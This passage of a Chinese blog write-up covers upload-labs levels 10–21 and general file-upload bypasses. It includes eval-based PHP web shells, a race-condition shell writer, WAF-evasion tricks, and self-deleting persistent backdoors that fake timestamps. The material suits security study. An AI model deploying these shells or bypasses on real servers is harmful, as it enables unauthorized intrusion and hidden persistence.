class="variable">$img_path</span>)) &#123;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面的代码都是在获取第一个点之后，把后面所有内容当成后缀，然后处理后缀，用时间作为文件名，处理后的后缀作为后缀名。但是现在变成了先处理后缀，然后直接filename直接作为文件名。</p>
+<p>使用<code>. .</code>作为后缀绕过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028124743651.png" alt="image-20201028124743651"></p>
+<p>末尾虽然有个<code>.</code>，但是Windows系统会忽略。Linux上应该不会被忽略。</p>
+<h4 id="关卡十一"><a href="#关卡十一" class="headerlink" title="关卡十一"></a>关卡十一</h4><p>源码如下，就是将文件名后缀在黑名单中的后缀进行替换 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>); <span class="comment">// 按照列表中的前后顺序，在文件名中查找并替换</span></span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/image-20201028130948272.png" alt="image-20201028130948272"></p>
+<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="关卡十二"><a href="#关卡十二" class="headerlink" title="关卡十二"></a>关卡十二</h4><p>%00截断，但是感觉局限大。没想到其他方案</p>
+<p>源代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123; ... &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 上传路径可以由GET控制，然后拼接文件名后缀。</span></span><br></pre></td></tr></table></figure>
+<p>条件：</p>
+<ul>
+<li>只是在php为5.2.17成功</li>
+<li>php.ini中的magic_quotes_gpc是off状态的。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132842.png" alt="image-20201029090159640"></p>
+<p>也就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>, <span class="string">&quot;../upload/123.php%00/tmp_name.png&quot;</span>) <span class="comment">// %00 后的内容被溶断</span></span><br></pre></td></tr></table></figure>
+<h4 id="关卡十三"><a href="#关卡十三" class="headerlink" title="关卡十三"></a>关卡十三</h4><p>还是和上面一样，文件路径可以控制，不过由GET方式编程POST方式。在GET里面使用<code>%00</code>可以熔断。在POST可以通过修改十六进制来熔断。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132851.png" alt="image-20201029124450922"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029132858.png" alt="image-20201029093955866"></p>
+<h3 id="图片木马-文件包含"><a href="#图片木马-文件包含" class="headerlink" title="图片木马+文件包含"></a>图片木马+文件包含</h3><h4 id="关卡十四"><a href="#关卡十四" class="headerlink" title="关卡十四"></a>关卡十四</h4><p>看了半天，实在想不出来怎么绕过的，因为虽然是外部传入，但是都是被程序控制住了。原来是upload-labs靶场提供了一个文件包含的测试页面，在根目录下include.php。那就简单了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line"><span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line"><span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">	<span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">		<span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">  	<span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">  	<span class="keyword">break</span>;        </span><br><span class="line">  <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:            </span><br><span class="line">  	<span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>通过前两个字节判断文件类型。然后拼接到文件名后面。上传图片马，然后文件包含就行了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029135515.png" alt="image-20201029135515226"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029140041.png" alt="image-20201029140041474"></p>
+<h4 id="关卡十五"><a href="#关卡十五" class="headerlink" title="关卡十五"></a>关卡十五</h4><p>还是图片木马上传，这里的检测姿势就是，通过内置函数获取上传文件的属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo//images/20201029141747.png" alt="image-20201029141740586"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">  <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>); </span><br><span class="line">  <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);   <span class="comment">// info[2]就是文件类型</span></span><br><span class="line">  <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="关卡十六"><a href="#关卡十六" class="headerlink" title="关卡十六"></a>关卡十六</h4><p>使用下面代码判断上传文件类型，基本上绕过就算凉了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type &#x3D; exif_imagetype($filename);</span><br></pre></td></tr></table></figure>
+<p>那只有类似于上面的文件包含了。</p>
+<h3 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h3><h4 id="关卡十七"><a href="#关卡十七" class="headerlink" title="关卡十七"></a>关卡十七</h4><p>这个用了图片的二次渲染，之前制作图片木马都是直接将代码加载图片最后面， 但是这里上传之后会将图片重新生成，就可能导致我们后门不能使用。但是二次渲染有部分位置是不会变化的，所以将我的代码写入这个不变的地方即可。</p>
+<p>然后尝试着上传一个gif，使用文件包含看看能不能看出不同。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/imagesimage-20201107125711752.png" alt="image-20201107125711752"></p>
+<p>看其他的都是通过十六进制对比上传的图片和本地图片那些地方没有改变，从而写入木马。身为小白的我，用winhex没有尝试成功。 然后尝试直接包含，发现这一处没咋变化。 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131352.png" alt="image-20201107131351987"></p>
+<p>然后尝试把这个地方换成<code>&lt;?php phpinfo() ?&gt;</code> 上传成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107131712.png" alt="image-20201107131712629"></p>
+<h4 id="关卡十八"><a href="#关卡十八" class="headerlink" title="关卡十八"></a>关卡十八</h4><p>条件竞争上传，产生的原因是，代码先将我们上传的文件写入到服务器后，再判断文件是否合法。这样就产生一个空隙，可以用burpsuite使劲上传，一边用python脚本可劲的访问。</p>
+<p>使用burpsuite不断上传包含内容如下的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后使用python不断发包，访问上面的<code>test.php</code>。在机缘巧合之下，就能将文件上传的还没删除的时候，python发包访问了这个php文件，就能执行上面的代码，从而会新创建一个名为<code>shell.php</code>的后门文件。</p>
+<h4 id="关卡十九"><a href="#关卡十九" class="headerlink" title="关卡十九"></a>关卡十九</h4><p>上传图片马+文件包含</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107152713.png" alt="image-20201107152713812"></p>
+<p>直接使用include访问即可。</p>
+<h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><p>这一关感觉像是对上面的总结。</p>
+<p>黑名单过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="姿势一-2"><a href="#姿势一-2" class="headerlink" title="姿势一"></a>姿势一</h5><p>大小写绕过，上面已经写了</p>
+<h5 id="姿势二-3"><a href="#姿势二-3" class="headerlink" title="姿势二"></a>姿势二</h5><p>.user.ini 上传绕过</p>
+<h5 id="姿势三"><a href="#姿势三" class="headerlink" title="姿势三"></a>姿势三</h5><p>空格绕过</p>
+<h5 id="姿势四"><a href="#姿势四" class="headerlink" title="姿势四"></a>姿势四</h5><p><code>.</code>绕过</p>
+<h5 id="姿势五"><a href="#姿势五" class="headerlink" title="姿势五"></a>姿势五</h5><p>::$DATA绕过</p>
+<h4 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h4><p>检查了Content-Type，不过这个好绕过。重点是下面这个</p>
+<p>函数绕过关键位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure>
+<p>后端也即是<code>$file</code>获取的是个数组，其中<code>$file[0]</code>为<code>upload-20file</code>，<code>$file[3]</code>为<code>png</code></p>
+<p>所以<code>count($file)=2</code></p>
+<p>那么<code>$file[count($file) - 1] ==&gt; $file[1]</code>  POST的时候没对<code>$file[1]赋值</code>，所以为空。 </p>
+<p>而<code>reset($file)=test.php</code></p>
+<p>所以整个组合起来就是  <code>test.php.</code></p>
+<p><code>Windows</code>创建<code>test.php.</code>的时候会忽略最后一个点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/unihac/picGo/images/20201107170002.png" alt="image-20201107170002502"></p>
+<h1 id="上传总结"><a href="#上传总结" class="headerlink" title="上传总结"></a>上传总结</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219107">https://www.anquanke.com/post/id/219107</a></p>
+<h1 id="文件上传Bypass"><a href="#文件上传Bypass" class="headerlink" title="文件上传Bypass"></a>文件上传Bypass</h1><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>安全狗对于http头字段： Content-Disposition: 处理的不是很好， 当长度增加到48930的时候，安全狗的上传防御就失效了。结果如下图：</p>
+<p><img src="https://pureqh.top/wp-content/uploads/2019/07/image-56.png" alt="img"></p>
+<h3 id="使用其他标签绕过"><a href="#使用其他标签绕过" class="headerlink" title="使用其他标签绕过"></a>使用其他标签绕过</h3><p>例如，上传的时候过滤了<code>&lt;?</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>或者使用段标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><p>方式一：</p>
+<p>将<code>filename=&quot;shell.php&quot;</code> 改为 <code>filename=shell.php;</code></p>
+<p>方式二：</p>
+<p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename==&quot;shell.php&quot;</code></p>
+<p>方法三：</p>
+<p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename=&quot;shell;shel.php&quot;</code></p>
+<p>方式四：</p>
+<p>将<code>filename=&quot;shell.php&quot;</code>改为<code>filename=&quot;shell.txt&quot; filename=&quot;shell.php&quot;</code></p>
+<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3><p><strong>内存马</strong>，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不死马.php → 上传到server → server执行文件 → server本地无限循环生成 (一句话.php)</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);  <span class="comment">//这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);  <span class="comment">//函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);  <span class="comment">//删除文件本身，以起到隐蔽自身的作用。</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#x27;</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);  <span class="comment">//循环内每隔usleep(5000)即写新的后门文件</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>改进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>); <span class="comment">//<span class="meta">&lt;?php</span> eval($_POST[c]);<span class="meta">?&gt;</span></span></span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>))===md5(<span class="variable">$cod0e0</span>)) &#123;</span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">http://example.com/2021/03/23/文件上传总结/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-Labs"><span class="toc-number">1.1.</span> <span class="toc-text">Upload-Labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%B1%9E%E6%80%A7%E5%88%A4%E6%96%AD"><span class="toc-number">1.1.1.</span> <span class="toc-text">上传属性判断</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A11"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">关卡1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E4%BA%8C"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">关卡二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E4%B8%89"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">关卡三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%9B%9B"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">关卡四</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E4%BA%94"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">关卡五</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">姿势一: 解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C"><span class="toc-number">1.1.2.3.2.</span> <span class="toc-text">姿势二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A16"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">关卡6</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80"><span class="toc-number">1.1.2.4.1.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C-1"><span class="toc-number">1.1.2.4.2.</span> <span class="toc-text">姿势二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E4%B8%83"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">关卡七</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80-1"><span class="toc-number">1.1.2.5.1.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C-2"><span class="toc-number">1.1.2.5.2.</span> <span class="toc-text">姿势二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%85%AB"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">关卡八</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E6%9C%AB%E5%B0%BE%E5%8A%A0-%E7%BB%95%E8%BF%87%E3%80%82"><span class="toc-number">1.1.2.6.1.</span> <span class="toc-text">姿势一：末尾加.绕过。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.1.2.6.2.</span> <span class="toc-text">姿势二：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E4%B9%9D"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">关卡九</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81"><span class="toc-number">1.1.2.8.</span> <span class="toc-text">关卡十</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%B8%80"><span class="toc-number">1.1.2.9.</span> <span class="toc-text">关卡十一</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%BA%8C"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">关卡十二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%B8%89"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">关卡十三</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.4.</span> <span class="toc-text">图片木马+文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E5%9B%9B"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">关卡十四</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%BA%94"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">关卡十五</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E5%85%AD"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">关卡十六</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.5.</span> <span class="toc-text">其他类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E4%B8%83"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">关卡十七</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E5%8D%A1%E5%8D%81%E5%85%AB"><span 